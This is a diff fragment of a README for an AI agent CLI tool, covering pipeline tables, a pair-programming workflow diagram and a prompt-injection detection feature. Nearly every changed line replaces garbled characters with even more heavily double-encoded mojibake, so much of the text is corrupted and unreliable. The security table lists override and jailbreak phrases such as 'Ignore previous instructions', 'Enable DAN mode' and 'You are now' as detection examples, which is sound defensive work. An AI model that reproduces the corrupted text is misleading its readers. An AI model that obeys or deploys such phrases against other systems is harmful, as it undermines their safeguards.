¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Creating Pipelines
@@ -5917,17 +5917,17 @@ npx ruflo@latest stream-chain status feature-pipeline
 
 | Pipeline | Stages | Output |
 |----------|--------|--------|
-| **Feature Development** | research Ã¢â€ â€™ design Ã¢â€ â€™ implement Ã¢â€ â€™ test Ã¢â€ â€™ review | Reviewed code |
-| **Security Audit** | scan Ã¢â€ â€™ analyze Ã¢â€ â€™ remediate Ã¢â€ â€™ verify | Security report |
-| **Documentation** | research Ã¢â€ â€™ outline Ã¢â€ â€™ write Ã¢â€ â€™ review | Documentation |
-| **Migration** | analyze Ã¢â€ â€™ plan Ã¢â€ â€™ migrate Ã¢â€ â€™ validate | Migrated code |
+| **Feature Development** | research ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ design ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ implement ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ test ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ review | Reviewed code |
+| **Security Audit** | scan ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ analyze ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ remediate ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ verify | Security report |
+| **Documentation** | research ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ outline ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ write ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ review | Documentation |
+| **Migration** | analyze ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ plan ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ migrate ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ validate | Migrated code |
 
 </details>
 
 ---
 
 <details>
-<summary>Ã°Å¸â€˜Â¥ <strong>Pair Programming</strong> Ã¢â‚¬â€ Collaborative AI Development</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¥ <strong>Pair Programming</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Collaborative AI Development</summary>
 
 The Pair Programming skill provides **human-AI collaborative coding** with role switching, TDD support, and real-time verification.
 
@@ -5956,23 +5956,23 @@ npx ruflo@latest pair start --mode navigator
 ### TDD Mode Workflow
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                     TDD PAIR PROGRAMMING                            Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€š  1. Human writes failing test                                       Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€ â€œ                                                         Ã¢â€â€š
-Ã¢â€â€š  2. AI implements minimal code to pass                              Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€ â€œ                                                         Ã¢â€â€š
-Ã¢â€â€š  3. Tests run automatically                                         Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€ â€œ                                                         Ã¢â€â€š
-Ã¢â€â€š  4. AI suggests refactoring                                         Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€ â€œ                                                         Ã¢â€â€š
-Ã¢â€â€š  5. Human approves/modifies                                         Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€ â€œ                                                         Ã¢â€â€š
-Ã¢â€â€š  6. Repeat                                                          Ã¢â€â€š
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                     TDD PAIR PROGRAMMING                            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  1. Human writes failing test                                       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Å“                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  2. AI implements minimal code to pass                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Å“                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  3. Tests run automatically                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Å“                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  4. AI suggests refactoring                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Å“                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  5. Human approves/modifies                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬Å“                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  6. Repeat                                                          ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Features
@@ -6006,14 +6006,14 @@ npx ruflo@latest pair end
 
 ---
 
-## Ã°Å¸â€ºÂ¡Ã¯Â¸Â Security
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â Security
 
 AI manipulation defense, threat detection, and input validation.
 
 <details>
-<summary>Ã°Å¸â€ºÂ¡Ã¯Â¸Â <strong>AIDefence Security</strong> Ã¢â‚¬â€ Threat Detection, PII Scanning</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>AIDefence Security</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Threat Detection, PII Scanning</summary>
 
-**AI Manipulation Defense System (AIMDS)** Ã¢â‚¬â€ Protect AI applications from prompt injection, jailbreaks, and data exposure with sub-millisecond detection.
+**AI Manipulation Defense System (AIMDS)** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Protect AI applications from prompt injection, jailbreaks, and data exposure with sub-millisecond detection.
 
 ```
 Detection Time: 0.04ms | 50+ Patterns | Self-Learning | HNSW Vector Search
@@ -6033,13 +6033,13 @@ Detection Time: 0.04ms | 50+ Patterns | Self-Learning | HNSW Vector Search
 
 | Category | Severity | Patterns | Detection Method | Examples |
 |----------|----------|----------|------------------|----------|
-| **Instruction Override** | Ã°Å¸â€Â´ Critical | 4+ | Keyword + context | "Ignore previous instructions" |
-| **Jailbreak** | Ã°Å¸â€Â´ Critical | 6+ | Multi-pattern | "Enable DAN mode", "bypass restrictions" |
-| **Role Switching** | Ã°Å¸Å¸Â  High | 3+ | Identity analysis | "You are now", "Act as" |
-| **Context Manipulation** | Ã°Å¸â€Â´ Critical | 6+ | Delimiter detection | Fake `[system]` tags, code blocks |
-| **Encoding Attacks** | Ã°Å¸Å¸Â¡ Medium | 2+ | Obfuscation scan | Base64, ROT13, hex payloads |
